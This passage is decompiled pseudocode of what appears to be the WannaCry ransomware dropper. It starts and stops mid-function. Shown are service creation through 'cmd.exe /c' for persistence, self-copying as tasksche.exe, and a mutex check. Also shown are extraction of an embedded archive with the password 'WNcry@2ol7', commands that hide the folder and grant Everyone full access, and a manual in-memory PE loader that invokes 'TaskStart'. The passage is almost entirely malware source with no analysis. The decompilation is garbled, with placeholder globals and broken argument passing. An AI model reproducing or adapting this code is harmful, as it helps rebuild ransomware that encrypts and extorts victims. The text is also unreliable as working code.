            // 0x401c38
            *(int32_t *)(v9 - 4) = 1;
            // 0x401ce4
            return 1;
        }
    }
    // 0x401c40
    swprintf(&wstr, 0x40f3f8, (int16_t *)&lpBuffer);
    if (function_401af6(&wstr, &lpWideCharStr, a1) != 0 || function_401af6((int16_t *)&lpBuffer, &lpWideCharStr, a1) != 0) {
        // 0x401c38
        *(int32_t *)(v7 - 4) = 1;
        // 0x401ce4
        return 1;
    }
    // 0x401c8f
    GetTempPathW(260, &wstr);
    if (wcsrchr(&wstr, 92) != NULL) {
        // 0x401cb4
        *wcsrchr(&wstr, 92) = 0;
    }
    // 0x401ce4
    return function_401af6(&wstr, &lpWideCharStr, a1) != 0;
}

// Address range: 0x401ce8 - 0x401dab
int32_t function_401ce8(int32_t * a1) {
    int32_t * hSCManager = OpenSCManagerA(NULL, NULL, 0xf003f); // 0x401cfe
    if (hSCManager == NULL) {
        // 0x401da8
        return 0;
    }
    int32_t v1 = (int32_t)hSCManager; // 0x401cfe
    int32_t * hService2 = OpenServiceA(hSCManager, (char *)&g41, 0xf01ff); // 0x401d21
    int32_t result; // 0x401ce8
    int32_t * v2; // 0x401ce8
    int32_t v3; // bp-1092, 0x401ce8
    if (hService2 == NULL) {
        // 0x401d45
        int32_t str; // bp-1040, 0x401ce8
        sprintf((char *)&str, "cmd.exe /c \"%s\"", a1);
        v3 = 0;
        int32_t v4 = v1; // bp-1128, 0x401d72
        int32_t * hService = CreateServiceA(hSCManager, (char *)&g41, (char *)&g41, 0xf01ff, 16, 2, 1, (char *)&str, NULL, NULL, NULL, NULL, NULL); // 0x401d75
        v2 = &v4;
        result = 0;
        if (hService != NULL) {
            // 0x401d81
            StartServiceA(hService, 0, NULL);
            int32_t v5 = (int32_t)hService; // bp-1144, 0x401d8a
            CloseServiceHandle(hService);
            v2 = &v5;
            result = 1;
        }
    } else {
        // 0x401d2e
        StartServiceA(hService2, 0, NULL);
        v3 = (int32_t)hService2;
        CloseServiceHandle(hService2);
        v2 = &v3;
        result = 1;
    }
    // 0x401d9b
    *(int32_t *)((int32_t)v2 - 4) = v1;
    CloseServiceHandle(&g54);
    // 0x401da8
    return result;
}

// Address range: 0x401dab - 0x401e9e
int32_t function_401dab(int32_t a1, int32_t a2) {
    int32_t * hModule = (int32_t *)a1; // 0x401dc3
    int32_t * hResInfo = FindResourceA(hModule, (char *)2058, g23); // 0x401dc3
    if (hResInfo == NULL) {
        // 0x401e9a
        return 0;
    }
    int32_t * hResData = LoadResource(hModule, hResInfo); // 0x401dd3
    if (hResData == NULL) {
        // 0x401e9a
        return 0;
    }
    int32_t * v1 = LockResource(hResData); // 0x401dde
    if (v1 == NULL) {
        // 0x401e9a
        return 0;
    }
    int32_t v2 = a1; // bp-348, 0x401dee
    int32_t v3 = SizeofResource(hModule, hResInfo); // 0x401df1
    int32_t v4 = function_4075ad((int32_t)v1, v3, (int32_t)&g54); // 0x401df9
    if (v4 == 0) {
        // 0x401e9a
        return 0;
    }
    int32_t v5 = 0; // bp-304, 0x401e0e
    int32_t v6; // bp-300, 0x401dab
    __asm_rep_stosd_memset((char *)&v6, 0, 74);
    function_4075c4(v4, -1, &v5);
    int32_t v7 = &v2; // 0x401e38
    int32_t v8 = v7; // 0x401e3f
    int32_t * v9; // 0x401dab
    int32_t * v10; // 0x401dab
    int32_t * v11; // 0x401dab
    int32_t v12; // 0x401dab
    int32_t v13; // 0x401dab
    int32_t v14; // 0x401dab
    int32_t v15; // 0x401dab
    int32_t v16; // 0x401dab
    int32_t v17; // 0x401dab
    if (v5 >= 1) {
        // 0x401e41
        v17 = &v6;
        v14 = v7;
        v12 = 0;
        while (true) {
          lab_0x401e41:
            // 0x401e41
            v13 = v12;
            int32_t v18 = v14 - 4;
            int32_t * v19 = (int32_t *)v18;
            *v19 = (int32_t)&v5;
            int32_t * v20 = (int32_t *)(v14 - 8);
            *v20 = v13;
            int32_t * v21 = (int32_t *)(v14 - 12);
            *v21 = v4;
            function_4075c4((int32_t)&g54, (int32_t)&g54, &g54);
            int32_t * v22 = (int32_t *)(v14 - 16); // 0x401e55
            *v22 = (int32_t)"c.wnry";
            *(int32_t *)(v14 - 20) = v17;
            int32_t strcmp_rc = strcmp((char *)&g54, (char *)&g54); // 0x401e5b
            v9 = v21;
            v11 = v20;
            v10 = v19;
            v15 = v14;
            if (strcmp_rc != 0) {
                goto lab_0x401e79;
            } else {
                // 0x401e67
                *v19 = v17;
                int32_t v23 = GetFileAttributesA((char *)&g54); // 0x401e6e
                v9 = v22;
                v11 = v21;
                v10 = v20;
                v15 = v18;
                v16 = v18;
                if (v23 != -1) {
                    goto lab_0x401e8a;
                } else {
                    goto lab_0x401e79;
                }
            }
        }
    }
  lab_0x401e8f:;
    int32_t * v24 = (int32_t *)(v8 - 4); // 0x401e8f
    *v24 = v4;
    function_407656((int32_t)&g54);
    *v24 = 1;
    // 0x401e9a
    return 1;
  lab_0x401e79:
    // 0x401e79
    *v10 = v17;
    *v11 = v13;
    *v9 = v4;
    function_40763d((int32_t)&g54, (int32_t)&g54, (int32_t)&g54);
    v16 = v15;
    goto lab_0x401e8a;
  lab_0x401e8a:;
    int32_t v25 = v13 + 1; // 0x401e8a
    v14 = v16;
    v12 = v25;
    v8 = v16;
    if (v25 == v5) {
        // break -> 0x401e8f
        goto lab_0x401e8f;
    }
    goto lab_0x401e41;
}

// Address range: 0x401e9e - 0x401eff
int32_t function_401e9e(void) {
    // 0x401e9e
    int32_t v1; // bp-796, 0x401e9e
    int32_t v2 = function_401000(&v1, 1); // 0x401ec5
    int32_t result = 0; // 0x401ece
    if (v2 != 0) {
        int32_t v3 = rand(); // 0x401ed0
        int32_t v4; // bp-4, 0x401e9e
        int32_t str2 = *(int32_t *)((int32_t)&v4 - 12 + 4 * (int32_t)((0x100000000 * (int64_t)(v3 >> 31) | (int64_t)v3) % 3)); // 0x401ee2
        int32_t str; // bp-618, 0x401e9e
        strcpy((char *)&str, (char *)str2);
        result = function_401000(&v1, 0);
    }
    // 0x401efd
    return result;
}

// Address range: 0x401eff - 0x401f5d
int32_t function_401eff(uint32_t a1) {
    // 0x401eff
    int32_t str; // bp-104, 0x401eff
    sprintf((char *)&str, "%s%d", "Global\\MsWinZonesCacheCounterMutexA", 0);
    if (a1 < 1) {
        // 0x401f4e
        return 0;
    }
    int32_t v1 = 0; // 0x401f46
    int32_t v2; // bp-108, 0x401eff
    int32_t v3 = &v2;
    *(int32_t *)(v3 - 4) = (int32_t)&str;
    *(int32_t *)(v3 - 8) = 1;
    *(int32_t *)(v3 - 12) = 0x100000;
    int32_t * v4 = OpenMutexA((int32_t)&g54, (bool)&g54, (char *)&g54); // 0x401f31
    while (v4 == NULL) {
        int32_t v5 = v3 - 16; // 0x401f3b
        *(int32_t *)v5 = 1000;
        Sleep((int32_t)&g54);
        v1++;
        if (v1 >= a1) {
            // 0x401f4e
            return 0;
        }
        v3 = v5;
        *(int32_t *)(v3 - 4) = (int32_t)&str;
        *(int32_t *)(v3 - 8) = 1;
        *(int32_t *)(v3 - 12) = 0x100000;
        v4 = OpenMutexA((int32_t)&g54, (bool)&g54, (char *)&g54);
    }
    // 0x401f51
    *(int32_t *)(v3 - 16) = (int32_t)v4;
    CloseHandle(&g54);
    *(int32_t *)(v3 - 20) = 1;
    // 0x401f4e
    return 1;
}

// Address range: 0x401f5d - 0x401fe7
int32_t function_401f5d(void) {
    int32_t lpBuffer = g42; // bp-524, 0x401f6c
    int32_t v1; // bp-523, 0x401f5d
    __asm_rep_stosd_memset((char *)&v1, 0, 129);
    bool v2; // 0x401f5d
    int32_t v3 = (v2 ? -516 : 516) + (int32_t)&v1; // 0x401f7f
    *(int16_t *)v3 = 0;
    *(char *)(v3 + (v2 ? -2 : 2)) = 0;
    GetFullPathNameA("tasksche.exe", 520, (char *)&lpBuffer, NULL);
    if (function_401ce8(&lpBuffer) != 0) {
        // 0x401faf
        if (function_401eff(60) != 0) {
            // 0x401fde
            return 1;
        }
    }
    // 0x401fbb
    if (function_401064(&lpBuffer, 0, 0) != 0) {
        // 0x401fd2
        if (function_401eff(60) != 0) {
            // 0x401fde
            return 1;
        }
    }
    // 0x401fde
    return 0;
}

// Address range: 0x401fe7 - 0x40216e
int32_t function_401fe7(int32_t a1) {
    char lpFilename = g42; // bp-528, 0x401ff8
    int32_t v1; // bp-527, 0x401fe7
    __asm_rep_stosd_memset((char *)&v1, 0, 129);
    bool v2; // 0x401fe7
    int32_t v3 = (v2 ? -516 : 516) + (int32_t)&v1; // 0x40200b
    *(int16_t *)v3 = 0;
    *(char *)(v3 + (v2 ? -2 : 2)) = 0;
    int32_t v4 = 0; // bp-1792, 0x40201e
    GetModuleFileNameA(NULL, &lpFilename, 520);
    function_401225((int32_t *)&g41);
    int32_t v5 = &v4; // 0x40202f
    int32_t v6 = *__p___argc(); // 0x402036
    int32_t v7 = v5; // 0x402039
    if (v6 == 2) {
        int32_t str = *(int32_t *)((int32_t)*__p___argv() + 4); // 0x402048
        int32_t strcmp_rc = strcmp((char *)str, (char *)&g54); // 0x40204b
        v7 = v5;
        if (strcmp_rc == 0) {
            // 0x402056
            v7 = v5;
            if (function_401b5f(0) != 0) {
                // 0x402061
                CopyFileA(&lpFilename, "tasksche.exe", false);
                char * v8 = "tasksche.exe"; // bp-1808, 0x402075
                int32_t v9 = (int32_t)&v8; // 0x402075
                v7 = v9;
                if (GetFileAttributesA("tasksche.exe") != -1) {
                    // 0x402081
                    v7 = v9;
                    if (function_401f5d() != 0) {
                        // 0x402165
                        return 0;
                    }
                }
            }
        }
    }
    int32_t * v10 = (int32_t *)(v7 - 4); // 0x40209a
    *v10 = 92;
    int32_t * v11 = (int32_t *)(v7 - 8); // 0x40209c
    int32_t v12 = &lpFilename; // 0x40209c
    *v11 = v12;
    if (strrchr((char *)&g54, (int32_t)&g54) != NULL) {
        // 0x4020a5
        *v10 = 92;
        *v11 = v12;
        *strrchr((char *)&g54, (int32_t)&g54) = 0;
    }
    // 0x4020b4
    *v10 = v12;
    SetCurrentDirectoryA((char *)&g54);
    *v11 = 1;
    function_4010fd((int32_t)&g54);
    *v11 = (int32_t)"WNcry@2ol7";
    int32_t * v13 = (int32_t *)(v7 - 12); // 0x4020cf
    *v13 = 0;
    function_401dab((int32_t)&g54, (int32_t)&g54);
    function_401e9e();
    int32_t * v14 = (int32_t *)(v7 - 16); // 0x4020da
    *v14 = 0;
    int32_t * v15 = (int32_t *)(v7 - 20); // 0x4020db
    *v15 = 0;
    int32_t * v16 = (int32_t *)(v7 - 24); // 0x4020dc
    *v16 = (int32_t)"attrib +h .";
    function_401064(&g54, (int32_t)&g54, (int32_t)&g54);
    int32_t * v17 = (int32_t *)(v7 - 28); // 0x4020e6
    *v17 = 0;
    int32_t * v18 = (int32_t *)(v7 - 32); // 0x4020e7
    *v18 = 0;
    *(int32_t *)(v7 - 36) = (int32_t)"icacls . /grant Everyone:F /T /C /Q";
    function_401064(&g54, (int32_t)&g54, (int32_t)&g54);
    if (function_40170a() == 0) {
        // 0x402165
        return 0;
    }
    // 0x4020fe
    function_4012fd();
    *v11 = 0;
    *v13 = 0;
    *v14 = 0;
    if (function_401437((int32_t)&g54, (int32_t)&g54) == 0) {
        // 0x40215a
        _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ();
        // 0x402165
        return 0;
    }
    // 0x40211b
    int32_t v19; // bp-8, 0x401fe7
    *v15 = (int32_t)&v19;
    *v16 = (int32_t)"t.wnry";
    v19 = 0;
    int32_t v20 = function_4014a6(0, (int32_t)&g54); // 0x40212d
    if (v20 == 0) {
        // 0x40215a
        _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ();
        // 0x402165
        return 0;
    }
    // 0x402136
    *v17 = v19;
    *v18 = v20;
    int32_t v21 = function_4021bd((int32_t)&g54, (int32_t)&g54); // 0x40213a
    if (v21 == 0) {
        // 0x40215a
        _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ();
        // 0x402165
        return 0;
    }
    // 0x402145
    *v17 = (int32_t)"TaskStart";
    *v18 = v21;
    if (function_402924((int32_t)&g54, (int32_t)&g54) != 0) {
        // 0x402156
        *v17 = 0;
        *v18 = 0;
    }
    // 0x40215a
    _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ();
    // 0x402165
    return 0;
}

// Address range: 0x40216e - 0x402185
int32_t function_40216e(int32_t lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect) {
    // 0x40216e
    return (int32_t)VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, flProtect);
}

// Address range: 0x402185 - 0x402198
int32_t function_402185(int32_t lpAddress, int32_t dwSize, int32_t dwFreeType) {
    // 0x402185
    return VirtualFree((int32_t *)lpAddress, dwSize, dwFreeType);
}

// Address range: 0x402198 - 0x4021a3
int32_t * function_402198(char * lpLibFileName) {
    // 0x402198
    return LoadLibraryA(lpLibFileName);
}

// Address range: 0x4021a3 - 0x4021b2
int32_t (*function_4021a3(int32_t * hModule, char * lpProcName))() {
    // 0x4021a3
    return GetProcAddress(hModule, lpProcName);
}

// Address range: 0x4021b2 - 0x4021bd
bool function_4021b2(int32_t * hLibModule) {
    // 0x4021b2
    return FreeLibrary(hLibModule);
}

// Address range: 0x4021bd - 0x4021e9
int32_t function_4021bd(int32_t a1, int32_t a2) {
    // 0x4021bd
    return function_4021e9(a1, a2, 0x40216e, 0x402185, 0x402198, 0x4021a3, 0x4021b2, 0);
}

// Address range: 0x4021e9 - 0x402457
int32_t function_4021e9(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = a2; // bp-64, 0x4021f8
    if (function_402457(a2, 64) == 0) {
        // 0x402452
        return 0;
    }
    // 0x40220a
    int32_t v2; // bp-56, 0x4021e9
    int32_t v3 = &v2; // 0x402203
    int32_t v4 = v3; // 0x402212
    if (*(int16_t *)a1 == 0x5a4d) {
        int32_t * v5 = (int32_t *)(a1 + 60); // 0x402224
        v1 = a2;
        if (function_402457(a2, *v5 + 248) == 0) {
            // 0x402452
            return 0;
        }
        int32_t v6 = *v5 + a1; // 0x402242
        v4 = v3;
        if (*(int32_t *)v6 == 0x4550) {
            // 0x40224c
            v4 = v3;
            if (*(int16_t *)(v6 + 4) == 332) {
                int32_t v7 = *(int32_t *)(v6 + 56); // 0x402254
                v4 = v3;
                if ((v7 & 1) == 0) {
                    uint16_t v8 = *(int16_t *)(v6 + 6); // 0x402260
                    int32_t v9 = 0; // 0x40226a
                    if (v8 != 0) {
                        int32_t v10 = v6 + 36 + (int32_t)*(int16_t *)(v6 + 20); // 0x40226c
                        int32_t v11 = v8; // 0x40226c
                        uint32_t v12 = 0;
                        int32_t v13 = *(int32_t *)(v10 + 4); // 0x40226f
                        uint32_t v14 = (v13 != 0 ? v13 : v7) + *(int32_t *)v10;
                        int32_t v15 = v14 > v12 ? v14 : v12;
                        v11--;
                        v10 += 40;
                        v9 = v15;
                        while (v11 != 0) {
                            // 0x40226f
                            v12 = v15;
                            v13 = *(int32_t *)(v10 + 4);
                            v14 = (v13 != 0 ? v13 : v7) + *(int32_t *)v10;
                            v15 = v14 > v12 ? v14 : v12;
                            v11--;
                            v10 += 40;
                            v9 = v15;
                        }
                    }
                    // 0x40228c
                    if (GetModuleHandleA("kernel32.dll") == NULL) {
                        // 0x402452
                        return 0;
                    }
                    // 0x40229f
                    int32_t v16; // bp-44, 0x4021e9
                    v1 = &v16;
                    int32_t v17 = &v1; // 0x4022b8
                    int32_t v18; // 0x4021e9
                    int32_t v19 = v18 - 1;
                    int32_t v20 = -v18; // 0x4022cb
                    int32_t v21 = v9 + v19 & v20; // 0x4022d3
                    v4 = v17;
                    if ((*(int32_t *)(v6 + 80) + v19 & v20) == v21) {
                        int32_t v22 = 0x3000; // bp-76, 0x4022e2
                        int32_t v23; // 0x4021e9
                        if (v21 != 0) {
                            int32_t * hHeap = GetProcessHeap(); // 0x402313
                            v22 = (int32_t)hHeap;
                            int32_t * v24 = HeapAlloc(hHeap, (int32_t)&g54, (int32_t)&g54); // 0x40231a
                            int32_t v25; // bp-92, 0x4021e9
                            if (v24 != NULL) {
                                int32_t result = (int32_t)v24; // 0x40231a
                                *(int32_t *)(result + 4) = v21;
                                int32_t * v26 = (int32_t *)(result + 20); // 0x40234a
                                *v26 = (int32_t)(*(int16_t *)(v6 + 22) / 0x2000 & 1);
                                *(int32_t *)(result + 28) = a3;
                                *(int32_t *)(result + 32) = a4;
                                *(int32_t *)(result + 36) = a5;
                                *(int32_t *)(result + 40) = a6;
                                *(int32_t *)(result + 44) = a7;
                                *(int32_t *)(result + 48) = a8;
                                int32_t * v27 = (int32_t *)(v6 + 84); // 0x402377
                                int32_t v28 = function_402457(a2, *v27); // 0x40237d
                                int32_t v29 = &v22; // 0x402385
                                int32_t v30 = v29; // 0x402386
                                if (v28 != 0) {
                                    // 0x40238c
                                    v25 = *v27;
                                    memcpy((int32_t *)v28, (int32_t *)a1, *v27);
                                    int32_t v31 = *v5 + v28; // 0x4023ba
                                    *v24 = v31;
                                    *(int32_t *)(v31 + 52) = v21;
                                    v30 = v29;
                                    if (function_402470(a1, a2, v6, result) != 0) {
                                        int32_t v32 = *(int32_t *)(*v24 + 52) - *(int32_t *)(v6 + 52); // 0x4023d3
                                        if (v32 == 0) {
                                            // 0x4023e9
                                            *(int32_t *)(result + 24) = 1;
                                        } else {
                                            // 0x4023d8
                                            *(int32_t *)(result + 24) = function_402758(result, v32);
                                        }
                                        // 0x4023ef
                                        v30 = v29;
                                        if (function_4027df(result) != 0) {
                                            // 0x4023fa
                                            v30 = v29;
                                            if (function_40254b(result) != 0) {
                                                // 0x402405
                                                v30 = v29;
                                                if (function_40271d(result) != 0) {
                                                    int32_t v33 = *(int32_t *)(*v24 + 40); // 0x402414
                                                    if (v33 == 0) {
                                                        // 0x40244d
                                                        *(int32_t *)(result + 52) = 0;
                                                        // 0x402452
                                                        return result;
                                                    }
                                                    // 0x40241b
                                                    if (*v26 == 0) {
                                                        // 0x402446
                                                        *(int32_t *)(result + 52) = v33 + v21;
                                                        // 0x402452
                                                        return result;
                                                    }
                                                    if (v33 != -v21) {
                                                        // 0x402441
                                                        *(int32_t *)(result + 16) = 1;
                                                        // 0x402452
                                                        return result;
                                                    }
                                                    // 0x40242b
                                                    v25 = 1114;
                                                    SetLastError(1114);
                                                    v30 = &v25;
                                                }
                                            }
                                        }
                                    }
                                }
                                // 0x402436
                                *(int32_t *)(v30 - 4) = result;
                                function_4029cc((int32_t)&g54);
                                // 0x402452
                                return 0;
                            }
                            // 0x402326
                            v25 = v21;
                            v23 = &v22;
                        } else {
                            // 0x4022f7
                            v22 = 0x3000;
                            v23 = v17;
                        }
                        // 0x402336
                        *(int32_t *)(v23 - 4) = 14;
                        // 0x402219
                        SetLastError((int32_t)&g54);
                        // 0x402452
                        return 0;
                    }
                }
            }
        }
    }
    // 0x402214
    *(int32_t *)(v4 - 4) = 193;
    // 0x402219
    SetLastError((int32_t)&g54);
    // 0x402452
    return 0;
}

// Address range: 0x402457 - 0x402470
int32_t function_402457(uint32_t a1, uint32_t a2) {
    if (a1 >= a2) {
        // 0x40246c
        return 1;
    }
    // 0x402461
    SetLastError(13);
    return 0;
}

// Address range: 0x402470 - 0x40254b
int32_t function_402470(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402470
    int32_t v1; // bp-20, 0x402470
    int32_t v2 = &v1; // 0x402476
    int32_t * v3 = (int32_t *)a4; // 0x402484
    int32_t v4 = *v3; // 0x402484
    if (*(int16_t *)(v4 + 6) == 0) {
        // 0x40253f
        *(int32_t *)(v2 - 4) = 1;
        // 0x402542
        return 1;
    }
    int32_t v5 = *(int32_t *)(a4 + 4); // 0x40247e
    int32_t * v6 = (int32_t *)(a4 + 48);
    int32_t * v7 = (int32_t *)(v2 - 4);
    int32_t * v8 = (int32_t *)(v2 - 8);
    int32_t * v9 = (int32_t *)(v2 - 12);
    int32_t * v10 = (int32_t *)(v2 - 16);
    int32_t * v11 = (int32_t *)(v2 - 20);
    int32_t v12 = 0; // 0x402499
    int32_t v13 = v4 + 40 + (int32_t)*(int16_t *)(v4 + 20); // 0x402499
    while (true) {
        int32_t v14 = v13;
        int32_t * v15 = (int32_t *)v14; // 0x40249c
        int32_t v16 = *v15; // 0x40249c
        if (v16 != 0) {
            int32_t * v17 = (int32_t *)(v14 + 4); // 0x4024df
            *v7 = *v17 + v16;
            *v8 = a2;
            if (function_402457((int32_t)&g54, (int32_t)&g54) == 0) {
                // break -> 0x402542
                break;
            }
            // 0x4024f3
            *v7 = *v6;
            int32_t * v18 = (int32_t *)(v14 - 4); // 0x4024fb
            int32_t v19 = *v18 + v5; // 0x4024fb
            *v8 = 4;
            *v9 = 0x1000;
            *v10 = *v15;
            *v11 = v19;
            if (v19 == 0) {
                // break -> 0x402542
                break;
            }
            // 0x402512
            *v7 = *v15;
            int32_t v20 = *v18 + v5; // 0x40251a
            *v8 = *v17 + a1;
            *v9 = v20;
            memcpy(&g54, &g54, (int32_t)&g54);
            *(int32_t *)(v14 - 8) = v20;
        } else {
            uint32_t v21 = *(int32_t *)(a3 + 56); // 0x4024a5
            if (v21 >= 1) {
                // 0x4024ac
                *v7 = *v6;
                int32_t * v22 = (int32_t *)(v14 - 4); // 0x4024b2
                int32_t v23 = *v22 + v5; // 0x4024b2
                *v8 = 4;
                *v9 = 0x1000;
                *v10 = v21;
                *v11 = v23;
                if (v23 == 0) {
                    // break -> 0x402542
                    break;
                }
                // 0x4024c8
                *v7 = v21;
                int32_t v24 = *v22 + v5; // 0x4024cc
                *v8 = 0;
                *v9 = v24;
                *(int32_t *)(v14 - 8) = v24;
                memset(&g54, (int32_t)&g54, (int32_t)&g54);
            }
        }
        // 0x40252a
        v12++;
        v13 = v14 + 40;
        if (v12 >= (int32_t)*(int16_t *)(*v3 + 6)) {
            // 0x40253f
            *v7 = 1;
            // 0x402542
            return 1;
        }
    }
    // 0x402542
    return 0;
}

// Address range: 0x40254b - 0x40264f
int32_t function_40254b(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x402557
    int32_t v2 = *v1; // 0x402557
    int32_t v3 = v2 + 24 + (int32_t)*(int16_t *)(v2 + 20); // 0x40255d
    int32_t * v4 = (int32_t *)(a1 + 56); // 0x402561
    int32_t v5 = *(int32_t *)(v3 + 8); // 0x402566
    int32_t v6 = v5; // bp-32, 0x40256e
    int32_t v7 = function_40264f(a1, 0x10000 * v3 >> 16); // 0x402574
    int32_t v8 = *(int32_t *)(v3 + 36); // 0x40257d
    int32_t v9; // bp-44, 0x40254b
    int32_t v10 = &v9; // 0x40258c
    int32_t v11; // 0x40254b
    int32_t v12; // 0x40254b
    int32_t * v13; // 0x40254b
    int32_t * v14; // 0x40254b
    int32_t v15; // 0x40254b
    if (*(int16_t *)(*v1 + 6) < 2) {
        // 0x40254b
        v14 = (int32_t *)(v10 - 8);
        v15 = &v6;
        v13 = (int32_t *)(v10 - 4);
        v12 = v7;
        v11 = v8;
        goto lab_0x402631;
      lab_0x402631:
        // 0x402631
        *v13 = v15;
        *v14 = a1;
        // 0x402646
        return function_40267b(v12, v11) != 0;
    }
    // 0x40259d
    v13 = (int32_t *)(v10 - 4);
    v14 = (int32_t *)(v10 - 8);
    v15 = &v6;
    int32_t v16 = 1; // 0x40261b
    int32_t v17 = v5 & -*v4; // 0x40254b
    v12 = v7;
    v11 = v8;
    int32_t v18 = v3;
    while (true) {
        int32_t v19 = v18;
        int32_t v20 = v11;
        int32_t v21 = v17;
        v18 = v19 + 40;
        int32_t v22 = *(int32_t *)(v19 + 48); // 0x4025a0
        *v13 = v18;
        *v14 = a1;
        int32_t v23 = v22 & -*v4; // 0x4025ab
        int32_t v24 = function_40264f(v12, v20); // 0x4025ad
        int32_t v25 = v6; // 0x4025b5
        int32_t v26; // 0x40254b
        int32_t v27; // 0x40254b
        if (v21 == v23 || v25 + v12 > v23) {
            int32_t v28 = *(int32_t *)(v19 + 76); // 0x4025ef
            int32_t v29 = v28 | v20;
            v17 = v21;
            v27 = v24 + v22 - v25;
            v26 = (v20 & 0x2000000 & v28) == 0 ? v29 & -0x2000001 : v29;
        } else {
            // 0x4025c8
            *v13 = v15;
            *v14 = a1;
            if (function_40267b(v24, (int32_t)&g54) == 0) {
                // break -> 0x402646
                break;
            }
            // 0x4025d8
            v6 = v22;
            v17 = v23;
            v27 = v24;
            v26 = *(int32_t *)(v19 + 76);
        }
        // 0x402619
        v11 = v26;
        v12 = v27;
        v16 = (0x10000 * v16 >> 16) + 1;
        if (v16 >= (int32_t)*(int16_t *)(*v1 + 6)) {
            // 0x40262e
            *v13 = 1;
            goto lab_0x402631;
        }
    }
    // 0x402646
    return 0;
}

// Address range: 0x40264f - 0x40267b
int32_t function_40264f(int32_t a1, int32_t a2) {
    int32_t result = *(int32_t *)(a2 + 16); // 0x402653
    if (result != 0) {
        // 0x40267a
        return result;
    }
    int32_t v1 = *(int32_t *)(a2 + 36); // 0x40265a
    if ((v1 & 64) != 0) {
        // 0x402662
        return *(int32_t *)(*(int32_t *)a1 + 32);
    }
    int32_t result2 = result; // 0x40266f
    if ((char)v1 <= 255) {
        // 0x402671
        result2 = *(int32_t *)(*(int32_t *)a1 + 36);
    }
    // 0x40267a
    return result2;
}

// Address range: 0x40267b - 0x40271d
int32_t function_40267b(int32_t a1, int32_t a2) {
    int32_t lpflOldProtect = a2;
    int32_t dwSize = *(int32_t *)(a2 + 8); // 0x402683
    if (dwSize == 0) {
        // 0x40269d
        return 1;
    }
    uint32_t v1 = *(int32_t *)(a2 + 12); // 0x402692
    int32_t result = 1; // 0x40269b
    if ((v1 & 0x2000000) == 0) {
        int32_t v2 = *(int32_t *)(4 * (2 * (v1 / 0x40000000 & 1 | v1 / 0x10000000 & 2) | v1 / 0x80000000) + (int32_t)&g24); // 0x4026f9
        int32_t lpAddress = *(int32_t *)a2; // 0x40270b
        bool v3 = VirtualProtect((int32_t *)lpAddress, dwSize, v2 | v1 / 0x20000 & 512, &lpflOldProtect); // 0x40270d
        result = v3;
    }
    // 0x40269d
    return result;
}

// Address range: 0x40271d - 0x402758
int32_t function_40271d(int32_t a1) {
    int32_t v1 = *(int32_t *)(*(int32_t *)a1 + 192); // 0x40272c
    if (v1 == 0) {
        // 0x402732
        return 1;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x402722
    int32_t v3; // bp-8, 0x40271d
    int32_t v4 = &v3; // 0x402737
    int32_t v5 = *(int32_t *)(v2 + 12 + v1); // 0x402738
    if (v5 == 0) {
        // 0x402752
        *(int32_t *)(v4 - 4) = 1;
        return 1;
    }
    int32_t v6 = v5; // 0x402744
    int32_t v7 = v4; // 0x402744
    if (*(int32_t *)v5 == 0) {
        // 0x402752
        *(int32_t *)(v4 - 4) = 1;
        return 1;
    }
    *(int32_t *)(v7 - 4) = 0;
    *(int32_t *)(v7 - 8) = 1;
    v7 -= 12;
    *(int32_t *)v7 = v2;
    v6 += 4;
    while (*(int32_t *)v6 != 0) {
        // 0x402746
        *(int32_t *)(v7 - 4) = 0;
        *(int32_t *)(v7 - 8) = 1;
        v7 -= 12;
        *(int32_t *)v7 = v2;
        v6 += 4;
    }
    // 0x402752
    *(int32_t *)(v7 - 4) = 1;
    return 1;
}

// Address range: 0x402758 - 0x4027df
int32_t function_402758(int32_t a1, int32_t a2) {
    int32_t v1 = *(int32_t *)a1; // 0x402762
    if (*(int32_t *)(v1 + 164) == 0) {
        // 0x4027dc
        return a2 == 0;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x40275f
    int32_t v3 = *(int32_t *)(v1 + 160) + v2; // 0x40277b
    int32_t v4 = *(int32_t *)v3; // 0x40277d
    if (v4 == 0) {
        // 0x4027dc
        return 1;
    }
    int32_t * v5 = (int32_t *)(v3 + 4); // 0x40278c
    int32_t v6 = *v5; // 0x40278c
    int32_t v7 = v6; // 0x40279b
    int32_t v8; // 0x402758
    int32_t v9; // 0x4027bc
    int32_t v10; // 0x402758
    int32_t v11; // 0x402789
    int16_t v12; // 0x40279d
    int32_t v13; // 0x4027bf
    int32_t * v14; // 0x4027ba
    if ((v6 & -2) != 8) {
        // 0x40279d
        v11 = v4 + v2;
        v13 = 0;
        v10 = v3 + 8;
        v12 = *(int16_t *)v10;
        v8 = v6;
        if ((v12 & -0x1000) == 0x3000) {
            // 0x4027af
            v14 = (int32_t *)(v11 + (int32_t)(v12 & 4095));
            *v14 = *v14 + a2;
            v8 = *v5;
        }
        // 0x4027bc
        v9 = v8;
        v13++;
        v10 += 2;
        v7 = v9;
        while (v13 < (v9 - 8) / 2) {
            // 0x40279d
            v12 = *(int16_t *)v10;
            v8 = v9;
            if ((v12 & -0x1000) == 0x3000) {
                // 0x4027af
                v14 = (int32_t *)(v11 + (int32_t)(v12 & 4095));
                *v14 = *v14 + a2;
                v8 = *v5;
            }
            // 0x4027bc
            v9 = v8;
            v13++;
            v10 += 2;
            v7 = v9;
        }
    }
    int32_t v15 = v7 + v3; // 0x4027ce
    int32_t v16 = *(int32_t *)v15; // 0x4027d1
    while (v16 != 0) {
        int32_t v17 = v15;
        v5 = (int32_t *)(v17 + 4);
        v6 = *v5;
        v7 = v6;
        if ((v6 & -2) != 8) {
            // 0x40279d
            v11 = v16 + v2;
            v13 = 0;
            v10 = v17 + 8;
            v12 = *(int16_t *)v10;
            v8 = v6;
            if ((v12 & -0x1000) == 0x3000) {
                // 0x4027af
                v14 = (int32_t *)(v11 + (int32_t)(v12 & 4095));
                *v14 = *v14 + a2;
                v8 = *v5;
            }
            // 0x4027bc
            v9 = v8;
